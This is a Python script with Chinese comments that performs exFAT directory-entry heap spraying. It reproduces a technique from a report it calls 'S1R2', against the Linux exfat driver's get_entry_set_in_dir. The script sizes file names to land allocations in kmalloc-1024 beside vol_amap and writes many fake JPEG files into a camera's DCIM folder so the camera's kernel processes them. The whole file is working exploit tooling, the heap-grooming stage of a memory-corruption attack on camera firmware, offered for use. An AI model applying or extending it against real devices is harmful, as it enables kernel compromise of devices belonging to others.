#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
exfat_spray.py — 制造 exFAT 目录项堆喷（复刻 S1R2 报告的喷洒手法）

原理（drivers/staging/exfat/exfat_core.c: get_entry_set_in_dir）：
    num_entries = ((file_dentry_t *)ep)->num_ext + 1;
    bufsize     = offsetof(entry_set_cache_t, __buf) + num_entries * 32;
    es          = kmalloc(bufsize, GFP_KERNEL);      ← 大小由卡上 num_ext 决定
    ... 然后把卡上目录项逐个拷进这块内存              ← 内容由卡上目录项决定

entry set 构成：1 个 File 项(0x85) + 1 个 Stream 项(0xC0) + N 个 File Name 项(0xC1)
    num_ext   = 1 + N
    N         = ceil(文件名长度 / 15)      （每个 Name 项装 15 个 UTF-16 字符）

⇒ 用【文件名长度】控制 kmalloc 档位；用【文件名内容】控制载荷字节。

本卡（64GB）: ClusterCount=488288 → map_sectors=120 → vol_amap = 120*8 = 960 B → kmalloc-1024
⇒ 需要 bufsize ∈ (512, 1024]  ⇒  num_entries ∈ [16,31]  ⇒  文件名长度 ≈ 210–255

用法:
  ./exfat_spray.py size   <文件名长度>          # 打印会落在哪个 slab
  ./exfat_spray.py make   <挂载点> <数量> <长度>  # 在 DCIM/100_PANA 下创建喷洒文件
  ./exfat_spray.py clean  <挂载点>              # 删除喷洒文件
"""
import os
import shutil
import sys

OFFSETOF_BUF = 8          # entry_set_cache_t 里 __buf 的偏移（估计值，S1R2 用 8/16 量级）
ENTRY = 32


def calc(namelen):
    n_name = (namelen + 14) // 15          # File Name 项数量
    num_ext = 1 + n_name                   # Stream + N 个 Name
    num_entries = num_ext + 1              # 再加 File 项
    bufsize = OFFSETOF_BUF + num_entries * ENTRY
    for band in (128, 192, 256, 512, 1024, 2048, 4096, 8192):
        if bufsize <= band:
            return namelen, n_name, num_ext, num_entries, bufsize, band
    return namelen, n_name, num_ext, num_entries, bufsize, None


def cmd_size(namelen):
    r = calc(namelen)
    print("  文件名长度 %d → Name项 %d, num_ext %d, entries %d, bufsize %d → kmalloc-%s"
          % (r[0], r[1], r[2], r[3], r[4], r[5]))
    print()
    print("  目标 slab 速查（本卡需要 kmalloc-1024）:")
    for L in (60, 90, 120, 150, 180, 210, 225, 240, 255):
        r = calc(L)
        mark = "   ← 目标" if r[5] == 1024 else ""
        print("    长度 %-4d → entries %-3d bufsize %-5d kmalloc-%s%s"
              % (L, r[3], r[4], r[5], mark))


def spray_name(idx, namelen):
    """构造长度可控、且尽量像照片的名字（前缀 P 便于相机识别为媒体）。"""
    base = "P%07d" % (9000000 + idx)
    pad = namelen - len(base) - 4          # 4 = ".JPG"
    if pad < 0:
        pad = 0
    return base + ("A" * pad) + ".JPG"


def cmd_make(mnt, count, namelen):
    d = os.path.join(mnt, "DCIM", "100_PANA")
    if not os.path.isdir(d):
        print("!! 目录不存在: %s（请先用相机拍一张照片，让相机建好 DCIM/100_PANA）" % d)
        return 2
    r = calc(namelen)
    print("  喷洒参数: 数量=%d 文件名长度=%d" % (count, namelen))
    print("  → 每个文件: Name项 %d, entries %d, bufsize %d → kmalloc-%s"
          % (r[1], r[3], r[4], r[5]))
    if r[5] != 1024:
        print("  ⚠️ 本卡 vol_amap 在 kmalloc-1024，建议调整长度使 bufsize ∈ (512,1024]")
    made = 0
    for i in range(count):
        p = os.path.join(d, spray_name(i, namelen))
        try:
            with open(p, "wb") as f:
                f.write(b"\xff\xd8\xff\xe0" + b"\x00" * 200)   # 伪 JPEG 头
            made += 1
        except Exception as e:
            print("  创建失败 %s: %s" % (p[:40], e))
            break
    print("  已创建 %d 个喷洒文件" % made)
    return 0


def cmd_both(mnt, each):
    """两个档位一起喷：150 字符→kmalloc-512（32 位假设）；240 字符→kmalloc-1024（64 位假设）"""
    d = os.path.join(mnt, "DCIM", "100_PANA")
    if not os.path.isdir(d):
        print("!! 目录不存在: %s（请先用相机拍一张照片）" % d); return 2
    total = 0
    for namelen, tag in ((150, "kmalloc-512"), (240, "kmalloc-1024")):
        r = calc(namelen)
        print("  [%s] 文件名长度=%d entries=%d bufsize=%d" % (tag, namelen, r[3], r[4]))
        for i in range(each):
            # ★ 必须用 P+7位数字 开头，否则相机可能根本不 stat 这些文件
            base = "P%07d" % (7000000 + i) if namelen == 150 else "P%07d" % (8000000 + i)
            pad = namelen - len(base) - 4
            name = base + ("A" * max(pad, 0)) + ".JPG"
            p2 = os.path.join(d, name)
            try:
                with open(p2, "wb") as f:
                    f.write(b"\xff\xd8\xff\xe0" + b"\x00" * 200)
                total += 1
            except Exception as e:
                print("   失败: %s" % e); break
        print("   → 已创建 %d 个" % each)
    print("  合计 %d 个喷洒文件" % total)
    return 0


def cmd_clean(mnt):
    d = os.path.join(mnt, "DCIM", "100_PANA")
    n = 0
    for f in os.listdir(d) if os.path.isdir(d) else []:
        if "AAAAAAA" in f:
            try:
                os.remove(os.path.join(d, f)); n += 1
            except Exception:
                pass
    print("  已删除 %d 个喷洒文件" % n)
    return 0


def main():
    a = sys.argv[1:]
    if not a:
        print(__doc__); return 2
    if a[0] == "size":
        return cmd_size(int(a[1]) if len(a) > 1 else 240)
    if a[0] == "make":
        return cmd_make(a[1], int(a[2]) if len(a) > 2 else 60, int(a[3]) if len(a) > 3 else 240)
    if a[0] == "both":
        return cmd_both(a[1], int(a[2]) if len(a) > 2 else 120)
    if a[0] == "clean":
        return cmd_clean(a[1])
    print(__doc__); return 2


if __name__ == "__main__":
    sys.exit(main())
